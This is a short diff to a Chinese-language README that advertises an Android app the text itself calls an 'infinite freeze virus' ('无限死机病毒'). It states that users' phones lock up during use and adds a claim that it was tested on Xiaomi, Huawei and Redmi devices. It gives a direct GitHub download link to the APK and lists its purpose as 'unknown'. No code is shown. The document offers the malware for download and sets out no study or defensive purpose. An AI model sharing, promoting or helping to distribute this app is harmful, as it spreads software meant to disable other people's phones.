@@ -1,3 +1,5 @@
+nativeTask 无限死机病毒 
+
 作者：我思故我在
 用途：未知
 
@@ -5,6 +7,7 @@
 
 
 用户用着用着就会卡死。。。
+已测试：小米9 华为p6.0 红米青春版等。。
 
 下载地址：
 https://raw.githubusercontent.com/zhangweiqwe/Fugue1.231/master/nativeTaskBug/app-release.apk
